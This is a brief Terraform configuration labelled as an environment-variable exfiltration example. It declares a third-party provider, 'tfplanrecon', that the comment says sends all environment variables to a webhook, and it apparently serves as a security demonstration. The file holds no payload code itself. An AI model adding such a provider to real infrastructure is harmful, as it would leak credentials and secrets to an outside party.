# Environment Variable Exfiltration Example
# This data source will send all environment variables to a webhook URL

terraform {
  required_providers {
    tfplanrecon = {
      source = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}
